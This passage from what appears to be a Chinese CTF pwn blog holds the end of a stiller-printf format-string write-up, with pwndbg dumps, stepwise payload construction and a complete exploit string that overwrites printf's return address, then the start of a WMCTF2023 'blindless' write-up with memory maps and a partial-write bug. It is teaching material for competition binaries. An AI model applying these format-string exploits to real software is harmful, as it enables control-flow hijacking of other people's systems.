class="number">0xbfae382b2801a102</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│  <span class="number">0x7ffed951a638</span> ◂— <span class="number">0xbfd3e33a8a49a102</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│  <span class="number">0x7ffed951a640</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>│  <span class="number">0x7ffed951a648</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│  <span class="number">0x7ffed951a650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>│  <span class="number">0x7ffed951a658</span> —▸ <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">33</span>:<span class="number">0198</span>│  <span class="number">0x7ffed951a660</span> —▸ <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">34</span>:<span class="number">01</span>a0│  <span class="number">0x7ffed951a668</span> ◂— <span class="number">0xb5e79ed3527f8200</span></span><br><span class="line"><span class="number">35</span>:<span class="number">01</span>a8│  <span class="number">0x7ffed951a670</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">36</span>:<span class="number">01b</span>0│  <span class="number">0x7ffed951a678</span> —▸ <span class="number">0x7fc034d975c9</span> (__libc_start_main+<span class="number">137</span>) ◂— mov    r15, qword ptr [rip + <span class="number">0x1d29a0</span>]</span><br><span class="line"><span class="number">37</span>:<span class="number">01b</span>8│  <span class="number">0x7ffed951a680</span> —▸ <span class="number">0x56406778a295</span> ◂— endbr64 </span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0│  <span class="number">0x7ffed951a688</span> —▸ <span class="number">0x56406778cd90</span> —▸ <span class="number">0x56406778a1c0</span> ◂— endbr64 </span><br><span class="line"><span class="number">39</span>:<span class="number">01</span>c8│  <span class="number">0x7ffed951a690</span> —▸ <span class="number">0x7fc034fb22e0</span> —▸ <span class="number">0x564067789000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">3</span>a:<span class="number">01</span>d0│  <span class="number">0x7ffed951a698</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3b</span>:<span class="number">01</span>d8│  <span class="number">0x7ffed951a6a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3</span>c:<span class="number">01e0</span>│  <span class="number">0x7ffed951a6a8</span> —▸ <span class="number">0x56406778a120</span> ◂— endbr64 </span><br><span class="line"><span class="number">3</span>d:<span class="number">01e8</span>│  <span class="number">0x7ffed951a6b0</span> —▸ <span class="number">0x7ffed951a6e0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">3</span>e:<span class="number">01f</span>0│  <span class="number">0x7ffed951a6b8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3f</span>:<span class="number">01f</span>8│  <span class="number">0x7ffed951a6c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">40</span>:<span class="number">0200</span>│     <span class="number">0x7ffed951a6c8</span> —▸ <span class="number">0x56406778a145</span> ◂— hlt    </span><br><span class="line"><span class="number">41</span>:<span class="number">0208</span>│     <span class="number">0x7ffed951a6d0</span> —▸ <span class="number">0x7ffed951a6d8</span> ◂— <span class="number">0x38</span> <span class="comment">/* &#x27;8&#x27; */</span></span><br><span class="line"><span class="number">42</span>:<span class="number">0210</span>│     <span class="number">0x7ffed951a6d8</span> ◂— <span class="number">0x38</span> <span class="comment">/* &#x27;8&#x27; */</span></span><br><span class="line"><span class="number">43</span>:<span class="number">0218</span>│     <span class="number">0x7ffed951a6e0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">44</span>:<span class="number">0220</span>│ rbx <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">45</span>:<span class="number">0228</span>│     <span class="number">0x7ffed951a6f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">46</span>:<span class="number">0230</span>│ r13 <span class="number">0x7ffed951a6f8</span> —▸ <span class="number">0x7ffed951b0ee</span> ◂— <span class="string">&#x27;LC_NUMERIC=zh_CN.UTF-8&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>合适的指针链如下：<ul>
<li>0x7ffed951a5f8（43） -&gt; 0x7ffed951a6e8（73）</li>
<li>0x7ffed951a618（47） -&gt; 0x7ffed951a6f8（75）</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a5f8</span></span><br><span class="line">The index of format argument : <span class="number">44</span> (<span class="string">&quot;\%43$p&quot;</span>)</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a618</span></span><br><span class="line">The index of format argument : <span class="number">48</span> (<span class="string">&quot;\%47$p&quot;</span>)</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a658</span></span><br><span class="line">The index of format argument : <span class="number">56</span> (<span class="string">&quot;\%55$p&quot;</span>)</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a6e8</span></span><br><span class="line">The index of format argument : <span class="number">74</span> (<span class="string">&quot;\%73$p&quot;</span>)</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a6f8</span></span><br><span class="line">The index of format argument : <span class="number">76</span> (<span class="string">&quot;\%75$p&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>后续的操作参考了如下博客：<a target="_blank" rel="noopener" href="https://eth007.me/blog/ctf/stiller-printf/">LIT CTF 2023 - stiller-printf - Yet another format string to rule them all - Ethan’s Blog (eth007.me)</a> </p>
<p>为了利用指针链，首先我们需要将覆盖指针链的后2字节，使其指向 printf 的返回地址</p>
<p>首先需要了解一个技巧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*c\n&quot;</span>, <span class="number">0x31</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*c\n&quot;</span>, <span class="number">0x32</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*1$c\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*2$c\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*3$c\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test            </span><br><span class="line">                                                a</span><br><span class="line">                                                 b</span><br><span class="line">                                                <span class="number">1</span></span><br><span class="line">                                                 <span class="number">1</span></span><br><span class="line">                                                  <span class="number">1</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>%*c</code>：读取后续相邻的2个参数，第1个参数作为对其值，第2个参数作为数据</li>
<li><code>%*n$c</code>：读取后续第1，n个参数，第n个参数作为对其值，第1个参数作为数据</li>
</ul>
<p>分析以下 payload：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%*c</span><br></pre></td></tr></table></figure>
<ul>
<li>42个 <code>%c</code>，1个 <code>%*c</code>，因此第43个参数就会作为对其值（这里存放了 0x7ffed951a6e8）</li>
<li>因此整个 payload 的对其值为：0x7ffed951a6e8 + 42</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7ffed951a6e8</span> <span class="number">0x7ffed951a4c8</span></span><br><span class="line"><span class="number">0x7ffed951a6e8</span>-&gt;<span class="number">0x7ffed951a4c8</span> is <span class="number">-0x220</span> bytes (<span class="number">-0x44</span> words)</span><br></pre></td></tr></table></figure>
<ul>
<li>对该 payload 进行变形，使对其值为 0x7ffed951a4c8 + 0x10000 * n（printf 的返回地址），我们只需要利用后4位的值，因此n的值不重要</li>
<li>假设 n = 1 可以进行如下的计算：<ul>
<li><code>-0x220 % 0x10000 = 0xfde0</code></li>
<li><code>0xfde0 - 41 = 64951</code></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64951</span>c%*c</span><br></pre></td></tr></table></figure>
<p>为了覆盖指针链的后2字节，可以得出如下 payload：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn</span><br></pre></td></tr></table></figure>
<ul>
<li>新添加两个 <code>%c</code> 导致第47个参数成为 <code>%hn</code> 修改的对象，即是 <code>0x7ffed951a618</code></li>
<li>由于 <code>0x7ffed951a618(47)</code> 指向 <code>0x7ffed951a6f8(75)</code>，索引75会间接指向 printf 的返回地址（此时修改索引75即可修改 printf 的返回地址）</li>
</ul>
<p>然后写入如下 payload 修改 printf 的返回地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%<span class="number">133</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>可以使用 GDB 配合 <code>r &gt;/dev/null</code> 命令进行调试</li>
<li>由于栈的随机化较大，因此 <code>%*c</code> 会写入随机大小的对其值，<code>%133c</code> 正是其中一种情况的解（爆破概率为 1/16）</li>
</ul>
<p>虽然 <code>%*c</code> 的值是随机的，但我们可以通过再添加15个 <code>%*43$c</code> 的方法使其末尾一字节为 <code>\x00</code>（共16个 <code>%*43$c</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%<span class="number">8</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>这在理论上应该有效，但是当针对程序运行时每次都会过早退出</li>
</ul>
<p>这里作者给出了原因：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">done_add_func</span> <span class="params">(<span class="keyword">size_t</span> length, <span class="keyword">int</span> done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (done &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> done;</span><br><span class="line">  <span class="keyword">int</span> ret;</span><br><span class="line">  <span class="keyword">if</span> (INT_ADD_WRAPV (done, length, &amp;ret))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EOVERFLOW);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这是负责管理 %n 计数器的函数，done 变量是 printf 的 %n 的计数器</li>
<li>当它检测到整数溢出时，printf 将退出，并且由于使用了 int 数据类型</li>
<li>当我们尝试打印太多时，printf 将过早退出</li>
</ul>
<p>测试案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*1$c%2$lln\n&quot;</span>, <span class="number">0x80000000</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*1$c%2$lln\n&quot;</span>, <span class="number">0x70000000</span>, &amp;b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;a:0x%lx\nb:0x%lx\n&quot;</span>, a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">0x0</span></span><br><span class="line">b:<span class="number">0x70000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>由于第一个 printf 触发了整数溢出，导致赋值失败</li>
</ul>
<p>这里作者给出的解决办法是：利用另一条指针链进行间接修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%c%c%c%c%c%c%c%<span class="number">545</span>c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>往索引56中写入 0xa6f0，间接导致索引73也指向索引74（0x7ffed951a6f0），该索引的初始值为“0”，将其写入 15 次之后依然较小</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%c%c%c%c%c%c%c%<span class="number">545</span>c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%<span class="number">8</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>往索引73中写入 <code>0xa6f0+6</code>，此时索引74中的值变为 <code>0xa6f0+6</code>，该索引中的值较小，覆写15次也不会造成整数溢出</li>
<li>最后修改索引75即可修改 printf 的返回地址</li>
</ul>
<p>目前唯一的问题就是，该 payload 较长，超出了题目的限制：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="string">&quot;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%64949c%*c%c%c%hn%c%c%c%c%c%c%c%545c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%8c%75$hhn&quot;</span>)</span><br><span class="line"><span class="number">257</span></span><br></pre></td></tr></table></figure>
<p>可以做出如下调整：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%c%c%c%c%c%c%c%<span class="number">545</span>c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn%*c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%<span class="number">8</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>将第一个 <code>%*74$c</code> 修改为 <code>%*c</code> 可以节约几字节的空间</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%c%c%c%c%c%c%c%<span class="number">545</span>c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn%*c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%<span class="number">8</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/04/WMCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/04/WMCTF2023/" class="post-title-link" itemprop="url">WMCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-09-04 21:47:10 / Modified: 21:48:40" itemprop="dateCreated datePublished" datetime="2023-09-04T21:47:10+08:00">2023-09-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="blindless"><a href="#blindless" class="headerlink" title="blindless"></a>blindless</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">8</span>edd548324d994d7d9ceaba18aea6a9f0daf7c7c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p>提示文件如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x5625ff3e2000</span>     <span class="number">0x5625ff3e3000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e3000</span>     <span class="number">0x5625ff3e4000</span> r-xp     <span class="number">1000</span> <span class="number">1000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e4000</span>     <span class="number">0x5625ff3e5000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e5000</span>     <span class="number">0x5625ff3e6000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e6000</span>     <span class="number">0x5625ff3e7000</span> rw-p     <span class="number">1000</span> <span class="number">3000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff6b3000</span>     <span class="number">0x5625ff6d4000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7f2a72e98000</span>     <span class="number">0x7f2a72f99000</span> rw-p   <span class="number">101000</span> <span class="number">0</span>      [anon_7f2a72e98]</span><br><span class="line">    <span class="number">0x7f2a72f99000</span>     <span class="number">0x7f2a72fbb000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a72fbb000</span>     <span class="number">0x7f2a73133000</span> r-xp   <span class="number">178000</span> <span class="number">22000</span>  /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73133000</span>     <span class="number">0x7f2a73181000</span> r--p    <span class="number">4e000</span> <span class="number">19</span>a000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73181000</span>     <span class="number">0x7f2a73185000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73185000</span>     <span class="number">0x7f2a73187000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73187000</span>     <span class="number">0x7f2a7318d000</span> rw-p     <span class="number">6000</span> <span class="number">0</span>      [anon_7f2a73187]</span><br><span class="line">    <span class="number">0x7f2a7318d000</span>     <span class="number">0x7f2a7318e000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a7318e000</span>     <span class="number">0x7f2a731b1000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731b1000</span>     <span class="number">0x7f2a731b9000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731ba000</span>     <span class="number">0x7f2a731bb000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bb000</span>     <span class="number">0x7f2a731bc000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bc000</span>     <span class="number">0x7f2a731bd000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [anon_7f2a731bc]</span><br><span class="line">    <span class="number">0x7ffed494a000</span>     <span class="number">0x7ffed496b000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7ffed49f3000</span>     <span class="number">0x7ffed49f7000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffed49f7000</span>     <span class="number">0x7ffed49f9000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>局部写漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( c.key == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *data = code[c.index + <span class="number">1</span>];</span><br><span class="line">  c.index += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>申请一片大空间，使得 malloc 调用 mmap：</p>
